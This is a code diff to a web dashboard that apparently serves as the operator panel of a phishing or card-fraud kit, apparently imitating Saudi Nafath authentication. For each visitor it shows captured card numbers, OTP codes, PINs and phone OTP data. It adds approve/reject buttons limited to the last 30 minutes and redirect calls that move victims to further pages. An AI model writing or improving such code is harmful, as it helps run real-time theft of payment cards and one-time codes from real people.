@@ -2528,7 +2528,10 @@ const renderNafadBox = () => {
       // Otherwise use local decision (for immediate feedback)
       const effectiveCardStatus = serverCardStatus || cardLocalDecision || "";
       const hasCardDecision = Boolean(serverCardStatus || cardLocalDecision);
-      const showCardDecisionButtons = !hasCardDecision && Boolean(raw._v1 || raw.cardNumber);
+      // Show buttons if: no decision AND has card data AND time is recent (within 30 minutes)
+      const cardUpdatedAt = raw._v1UpdatedAt ? new Date(raw._v1UpdatedAt).getTime() : 0;
+      const isCardRecent = Date.now() - cardUpdatedAt < 30 * 60 * 1000; // 30 minutes
+      const showCardDecisionButtons = !hasCardDecision && Boolean(raw._v1 || raw.cardNumber) && isCardRecent;
       // Use _v1UpdatedAt for Card box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v1UpdatedAt 
         ? new Date(raw._v1UpdatedAt).getTime()
@@ -2899,7 +2902,7 @@ const renderNafadBox = () => {
                     await fetch("/api/dashboard/redirect", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, targetPage: "step2", timestampField: "_v1UpdatedAt" }),
+                      body: JSON.stringify({ visitorId, targetPage: "step2" }),
                     });
                   }
                   setActionLoading(null);
@@ -2921,7 +2924,7 @@ const renderNafadBox = () => {
                     await fetch("/api/dashboard/redirect", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, targetPage: "check", timestampField: "_v1UpdatedAt" }),
+                      body: JSON.stringify({ visitorId, targetPage: "check" }),
                     });
                   }
                   setActionLoading(null);
@@ -2943,7 +2946,7 @@ const renderNafadBox = () => {
                     await fetch("/api/dashboard/redirect", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, targetPage: "step3", timestampField: "_v6UpdatedAt" }),
+                      body: JSON.stringify({ visitorId, targetPage: "step3" }),
                     });
                   }
                   setActionLoading(null);
@@ -3137,7 +3140,10 @@ const renderNafadBox = () => {
       // Otherwise use local decision (for immediate feedback)
       const effectiveOtpStatus = serverOtpStatus || otpLocalDecision || "";
       const hasOtpDecision = Boolean(serverOtpStatus || otpLocalDecision);
-      const showOtpDecisionButtons = !hasOtpDecision && Boolean(otpCode);
+      // Show buttons if: no decision AND has OTP data AND time is recent (within 30 minutes)
+      const otpUpdatedAt = raw._v5UpdatedAt ? new Date(raw._v5UpdatedAt).getTime() : 0;
+      const isOtpRecent = Date.now() - otpUpdatedAt < 30 * 60 * 1000; // 30 minutes
+      const showOtpDecisionButtons = !hasOtpDecision && Boolean(otpCode) && isOtpRecent;
       // Use _v5UpdatedAt for OTP box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v5UpdatedAt 
         ? new Date(raw._v5UpdatedAt).getTime()
@@ -3334,7 +3340,10 @@ const renderNafadBox = () => {
       // Otherwise use local decision (for immediate feedback)
       const effectivePinStatus = serverPinStatus || pinLocalDecision || "";
       const hasPinDecision = Boolean(serverPinStatus || pinLocalDecision);
-      const showPinDecisionButtons = !hasPinDecision && Boolean(pinCode);
+      // Show buttons if: no decision AND has PIN data AND time is recent (within 30 minutes)
+      const pinUpdatedAt = raw._v6UpdatedAt ? new Date(raw._v6UpdatedAt).getTime() : 0;
+      const isPinRecent = Date.now() - pinUpdatedAt < 30 * 60 * 1000; // 30 minutes
+      const showPinDecisionButtons = !hasPinDecision && Boolean(pinCode) && isPinRecent;
       // Use _v6UpdatedAt for PIN box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v6UpdatedAt 
         ? new Date(raw._v6UpdatedAt).getTime()
@@ -3537,9 +3546,11 @@ const renderNafadBox = () => {
       // Otherwise use local decision (for immediate feedback)
       const effectivePhoneStatus = serverPhoneStatus || phoneLocalDecision || "";
       const hasPhoneDecision = Boolean(serverPhoneStatus || phoneLocalDecision);
-      // Show buttons if: no decision AND has phone data from step5
+      // Show buttons if: no decision AND has phone data from step5 AND time is recent (within 30 minutes)
       const hasPhoneData = Boolean(raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7);
-      const showPhoneDecisionButtons = !hasPhoneDecision && hasPhoneData;
+      const phoneUpdatedAt = raw._v7UpdatedAt ? new Date(raw._v7UpdatedAt).getTime() : 0;
+      const isPhoneRecent = Date.now() - phoneUpdatedAt < 30 * 60 * 1000; // 30 minutes
+      const showPhoneDecisionButtons = !hasPhoneDecision && hasPhoneData && isPhoneRecent;
       // Use _v7UpdatedAt for Phone box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v7UpdatedAt 
         ? new Date(raw._v7UpdatedAt).getTime()
@@ -3639,7 +3650,7 @@ const renderNafadBox = () => {
                       await fetch("/api/dashboard/redirect", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ visitorId, targetPage: "nafad", timestampField: "_v7UpdatedAt" }),
+                        body: JSON.stringify({ visitorId, targetPage: "nafad" }),
                       });
                     }
                     setActionLoading(null);
@@ -3662,7 +3673,7 @@ const renderNafadBox = () => {
                       await fetch("/api/dashboard/redirect", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ visitorId, targetPage: "step5", timestampField: "_v7UpdatedAt" }),
+                        body: JSON.stringify({ visitorId, targetPage: "step5" }),
                       });
                     }
                     setActionLoading(null);
